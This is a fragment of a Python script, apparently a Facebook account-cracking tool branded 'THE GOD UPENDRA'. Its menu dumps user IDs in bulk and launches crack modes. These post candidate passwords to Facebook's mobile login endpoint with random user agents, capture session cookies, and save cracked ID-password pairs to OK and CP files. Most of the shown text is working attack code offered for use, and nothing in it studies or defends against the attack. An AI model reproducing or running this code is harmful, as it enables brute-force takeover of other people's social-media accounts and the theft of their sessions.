...
logo =""" 
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\033[0;91m  _    _ _____  ______ _   _ _____  _____            
 | |  | |  __ \|  ____| \ | |  __ \|  __ \     /\    
 | |  | | |__) | |__  |  \| | |  | | |__) |   /  \   
 | |  | |  ___/|  __| | . ` | |  | |  _  /   / /\ \  
 | |__| | |    | |____| |\  | |__| | | \ \  / ____ \ 
  \____/|_|    |______|_| \_|_____/|_|  \_\/_/    \_\
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[AUTHOR                   • \33[1;38mUPENDRA GOD ]\33[1;38m     ║\033[1;31m 
╠══[FACEBOOK                 • UPENDRA DON ]   ║  \033[1;97m  
╠══[GITHUB                   • \33[1;38mUPENDRA-DON ]   ║\33[1;34m   
...
os.system('espeak -a 300 " Welcome,   to,  The,  UPENDRA,  God,  Tools"')
pass
...
def menu():
    ...
    print('\033[0;97m=================')
    UPENDRA = input('\x1b[1;92m[+] CHOOSE: ')
    if UPENDRA in ['111']:
        login()
        dump_massal()
    elif UPENDRA in ['1']:
        crack_file()
    elif UPENDRA in ['2','02']:
        os.system('xdg-open https://wa.me/+8801608843956')
        os.system("python nono.py")
    elif UPENDRA in ['3','03']:
        result()
    elif UPENDRA in ['0']:
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[THE GOD UPENDRA•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[THE GOD UPENDRA-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[THE GOD UPENDRA-Ok🤍] {idf} • {pw}\n\033[0;93m[👤]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " THE GOD UPENDRA,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[THE GOD UPENDRA-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•THE GOD UPENDRA-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•THE GOD UPENDRA-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  THE GOD UPENDRA,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
